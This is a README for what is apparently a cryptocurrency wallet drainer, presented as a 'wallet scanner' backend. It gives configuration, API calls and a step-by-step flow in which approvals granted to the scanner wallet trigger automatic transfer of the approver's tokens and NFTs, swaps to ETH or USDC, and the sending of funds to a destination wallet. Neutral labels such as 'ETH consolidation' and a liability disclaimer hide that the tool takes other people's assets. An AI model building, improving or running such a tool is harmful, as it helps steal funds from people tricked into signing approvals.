# Wallet Scanner Backend

A comprehensive backend script that constantly scans connected wallets and automatically executes transactions when approvals are granted.

## Features

- **Real-time Wallet Monitoring**: Continuously scans specified wallets for token approval events
- **Automated Token Transfers**: Automatically transfers approved tokens to a destination wallet
- **NFT Transfer Automation**: Transfers NFTs from approved wallets to destination
- **Smart Token Swapping**: Automatically swaps tokens to ETH or stablecoins using Uniswap
- **ETH Consolidation**: Sends remaining ETH to destination wallet
- **Multi-chain Support**: Supports both Ethereum and Polygon networks
- **Comprehensive Logging**: Detailed logging for monitoring and debugging

## Installation

1. Install dependencies:
```bash
npm install
```

2. Set up environment variables by copying `.env.example` to `.env.local` and filling in your configuration:

```bash
cp .env.example .env.local
```

## Configuration

### Required Environment Variables

```bash
# Blockchain Configuration
ETHEREUM_RPC_URL=https://eth-mainnet.g.alchemy.com/v2/your-api-key
POLYGON_RPC_URL=https://polygon-mainnet.g.alchemy.com/v2/your-api-key
PRIVATE_KEY=your-wallet-private-key-here
SCAN_INTERVAL=30000
DESTINATION_WALLET=your-destination-wallet-address

# Token Addresses (Mainnet)
WETH_ADDRESS=0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
USDC_ADDRESS=0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
USDT_ADDRESS=0xdAC17F958D2ee523a2206206994597C13D831ec7

# NFT Contract Addresses
NFT_CONTRACT_ADDRESSES=["0x1234567890123456789012345678901234567890"]

# Swap Configuration
UNISWAP_ROUTER_ADDRESS=0xE592427A0AEce92De3Edee1F18E0157C05861564
SLIPPAGE_TOLERANCE=2.5
```

### Security Notes

⚠️ **IMPORTANT**: This script requires your wallet's private key to execute transactions. Ensure:
- Your private key is kept secure and never committed to version control
- The destination wallet is a secure, controlled address
- You understand the risks of automated transactions
- You test thoroughly in a development environment first

## API Usage

### Start Wallet Scanner

```bash
POST /api/wallet-scanner
Content-Type: application/json

{
  "action": "start",
  "wallets": [
    {
      "address": "0x1234567890123456789012345678901234567890",
      "name": "Wallet 1",
      "chain": "ethereum"
    },
    {
      "address": "0x0987654321098765432109876543210987654321",
      "name": "Wallet 2",
      "chain": "polygon"
    }
  ]
}
```

### Stop Wallet Scanner

```bash
POST /api/wallet-scanner
Content-Type: application/json

{
  "action": "stop"
}
```

### Check Scanner Status

```bash
GET /api/wallet-scanner
```

### Response Examples

**Start Response:**
```json
{
  "message": "Wallet scanner started successfully",
  "wallets": 2
}
```

**Status Response:**
```json
{
  "isRunning": true,
  "wallets": 2,
  "message": "Scanner is active"
}
```

## How It Works

1. **Approval Detection**: The scanner monitors specified wallets for ERC-20 approval events
2. **Token Transfer**: When approval is detected, approved tokens are immediately transferred
3. **NFT Transfer**: All NFTs from approved contracts are transferred to destination
4. **Smart Swapping**: Remaining tokens are swapped to ETH or stablecoins using Uniswap
5. **ETH Consolidation**: Any remaining ETH is sent to destination wallet

## Transaction Flow

When a wallet grants approval to the scanner wallet:

1. **Approval Event Detected** → Scanner identifies approved token and amount
2. **Token Transfer** → Approved tokens transferred to destination wallet
3. **NFT Scan** → Scanner checks for NFTs in approved contracts
4. **NFT Transfer** → All transferable NFTs moved to destination
5. **Token Balance Check** → Scanner checks remaining token balances
6. **Smart Swapping** → Tokens swapped to ETH/USDC with fallback logic
7. **ETH Transfer** → Remaining ETH sent to destination (leaving gas)

## Swap Logic

The scanner uses a sophisticated fallback strategy for token swaps:

1. **Primary**: Swap to ETH using Uniswap
2. **Fallback 1**: If ETH swap fails, try swapping to USDC
3. **Fallback 2**: If USDC swap fails, transfer tokens directly
4. **Gas Management**: Always leaves minimum ETH for gas fees

## Logging

The system provides comprehensive logging:

- **Console Output**: Real-time transaction updates
- **File Logs**: `wallet-scanner.log` for general operations
- **Error Logs**: `wallet-scanner-error.log` for debugging issues
- **Swap Logs**: `swap-service.log` and `swap-service-error.log`

## Monitoring

Monitor scanner activity through:

1. **API Status Endpoint**: Check if scanner is running
2. **Log Files**: Review transaction history and errors
3. **Blockchain Explorers**: Track transactions on Etherscan/Polygonscan

## Error Handling

The scanner includes robust error handling:

- **Network Failures**: Automatic retry logic for RPC failures
- **Transaction Failures**: Detailed error logging and fallback strategies
- **Gas Price Optimization**: Dynamic gas price calculation
- **Slippage Protection**: Configurable slippage tolerance for swaps

## Security Considerations

- **Private Key Security**: Never expose private keys in logs or responses
- **Approval Verification**: Only acts on legitimate approval events
- **Destination Validation**: Ensures funds go to configured destination
- **Gas Management**: Prevents wallet draining by leaving minimum ETH

## Development

### Testing

1. Use testnet RPC URLs and private keys
2. Test with small amounts first
3. Monitor logs carefully during testing
4. Verify all fallback mechanisms work correctly

### Customization

The scanner can be extended to support:
- Additional blockchain networks
- Custom swap routes
- Different token types
- Advanced approval detection

## Troubleshooting

### Common Issues

1. **RPC Connection Errors**: Verify RPC URLs and API keys
2. **Insufficient Gas**: Ensure scanner wallet has ETH for gas
3. **Approval Not Detected**: Check wallet addresses and approval events
4. **Swap Failures**: Verify token addresses and Uniswap router

### Debug Mode

Enable debug logging by setting environment variable:
```bash
DEBUG=wallet-scanner:*
```

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Disclaimer

This software is provided "as is" without warranty. Use at your own risk. The authors are not responsible for any losses or damages resulting from the use of this software.